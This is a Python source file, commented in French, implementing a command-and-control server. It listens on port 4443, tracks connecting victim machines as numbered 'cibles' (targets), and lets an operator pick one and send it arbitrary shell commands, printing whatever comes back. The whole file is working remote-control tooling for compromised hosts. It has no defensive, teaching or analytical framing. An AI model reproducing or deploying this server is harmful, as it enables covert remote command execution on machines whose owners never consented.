import socket
import threading

class C2Server:
    def __init__(self, host='10.102.252.40', port=4443):
        # Initialisation des paramètres du serveur
        self.host = host
        self.port = port
        self.cibles = {}  # Dictionnaire pour stocker les cibles {cible_id: (ip, socket)}
        self.cible_count = 0  # Compteur pour générer des IDs uniques pour chaque cible
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Création d'un socket serveur
        self.server_socket.bind((self.host, self.port))  # Lier le socket à l'adresse et au port
        self.server_socket.listen(5)  # Le serveur écoute jusqu'à 5 connexions simultanées
        print(f"[+] Serveur en écoute sur {self.host}:{self.port}")

    def accept_clients(self):
        # Fonction pour accepter les connexions des cibles
        while True:
            # Accepter une nouvelle connexion (blocage ici jusqu'à une connexion entrante)
            client_socket, client_address = self.server_socket.accept()
            ip = client_address[0]  # Récupérer l'IP de la cible
            # Créer un ID unique pour chaque nouvelle cible
            cible_id = f"cible_{self.cible_count}"
            # Stocker l'IP et le socket de la cible dans le dictionnaire
            self.cibles[cible_id] = (ip, client_socket)
            # Incrémenter le compteur de cibles
            self.cible_count += 1
            print(f"[+] {cible_id} connecté depuis {ip}")

    def display_menu(self):
        # Afficher le menu des choix pour l'utilisateur
        print("\n--- Menu C2 ---")
        print("1. Lister les cibles")
        print("2. Sélectionner une cible")
        print("3. Quitter")
        choice = input("Choisissez une option (1, 2, 3): ").strip()
        return choice  # Retourner le choix de l'utilisateur

    def command_loop(self):
        # Boucle principale pour gérer les commandes de l'utilisateur
        while True:
            choice = self.display_menu()  # Afficher le menu et obtenir un choix
            if choice == "1":
                self.list_cibles()  # Lister les cibles connectées
            elif choice == "2":
                self.select_cible()  # Sélectionner une cible et interagir avec elle
            elif choice == "3":
                print("[+] Arrêt du serveur...")
                return  # Quitter proprement la fonction de boucle des commandes
            else:
                print("[!] Choix invalide, essayez à nouveau.")  # Si le choix est invalide

    def list_cibles(self):
        # Afficher la liste des cibles connectées
        if not self.cibles:
            print("[!] Aucune cible connectée.")  # Si aucune cible n'est connectée
        else:
            print("\nCibles connectées:")
            for cible_id, (ip, _) in self.cibles.items():  # Afficher chaque cible avec son IP
                print(f"- {cible_id} (IP: {ip})")

    def select_cible(self):
        # Demander à l'utilisateur de saisir l'ID de la cible à sélectionner
        cible_id = input("Entrez l'ID de la cible (par exemple, cible_0) : ").strip()
        if cible_id in self.cibles:
            self.interact(cible_id)  # Si la cible existe, entrer en mode interactif avec elle
        else:
            print("[!] Cible non trouvée.")  # Si la cible n'est pas valide, afficher un message d'erreur

    def interact(self, cible_id):
        # Fonction pour interagir avec la cible sélectionnée
        ip, sock = self.cibles[cible_id]  # Récupérer l'IP et le socket de la cible
        while True:
            # Demander à l'utilisateur de saisir une commande pour la cible
            cmd = input(f"{cible_id} > ").strip()
            if cmd == "back":
                print(f"Retour au menu principal...")
                return  # Revenir au menu principal sans quitter le serveur
            sock.send(cmd.encode())  # Envoyer la commande à la cible
            data = sock.recv(4096)  # Recevoir la réponse de la cible
            print(data.decode())  # Afficher la réponse reçue de la cible

    def run(self):
        # Démarrer un thread pour accepter les connexions des cibles
        threading.Thread(target=self.accept_clients, daemon=True).start()
        # Lancer la boucle de commandes de l'utilisateur
        self.command_loop()

        # Fermer le serveur proprement à la fin
        self.server_socket.close()
        print("\nServeur fermé.")
